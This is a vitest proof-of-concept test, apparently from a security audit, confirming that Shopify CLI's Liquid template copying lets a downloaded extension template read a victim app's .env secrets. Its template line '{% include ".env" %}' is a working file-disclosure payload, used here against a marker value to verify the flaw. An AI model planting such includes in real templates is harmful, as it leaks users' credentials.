import {expect, test} from 'vitest'
import {mkdtemp, mkdir, readFile, writeFile} from 'node:fs/promises'
import {tmpdir} from 'node:os'
import {dirname, join} from 'node:path'
import {fileURLToPath} from 'node:url'
import {recursiveLiquidTemplateCopy} from '@shopify/cli-kit/node/liquid'

const findingDir = dirname(fileURLToPath(import.meta.url))
const evidenceDir = join(findingDir, 'evidence')
const observationPath = join(evidenceDir, 'confirm-test-observation.json')

test('test_confirm_p12_extension_generate_liquid_root_file_disclosure_nosessid', async () => {
  await mkdir(evidenceDir, {recursive: true})
  const workDir = await mkdtemp(join(tmpdir(), 'piolium-extension-liquid-confirm-'))
  const victimApp = join(workDir, 'victim-app')
  const templateDir = join(workDir, 'downloaded-extension-template')
  const extensionOutput = join(victimApp, 'extensions', 'leaky-ext')
  await mkdir(victimApp, {recursive: true})
  await mkdir(templateDir, {recursive: true})
  const marker = `PIOLIUM_EXTENSION_LIQUID_CONFIRM_${Date.now()}`
  await writeFile(join(victimApp, '.env'), `PIOLIUM_SECRET=${marker}\n`)
  await writeFile(join(templateDir, 'leak.txt.liquid'), '{% include ".env" %}')

  const originalCwd = process.cwd()
  try {
    process.chdir(victimApp)
    await recursiveLiquidTemplateCopy(templateDir, extensionOutput, {name: 'leaky-ext', type: 'theme'})
  } finally {
    process.chdir(originalCwd)
  }

  const generatedPath = join(extensionOutput, 'leak.txt')
  const generated = await readFile(generatedPath, 'utf8')
  await writeFile(
    observationPath,
    JSON.stringify(
      {
        finding: 'p12-extension-generate-liquid-root-file-disclosure',
        victimApp,
        templateFile: join(templateDir, 'leak.txt.liquid'),
        generatedPath,
        marker,
        generated,
        confirmed: generated.includes(marker),
      },
      null,
      2,
    ),
  )

  expect(generated).toContain(marker)
})
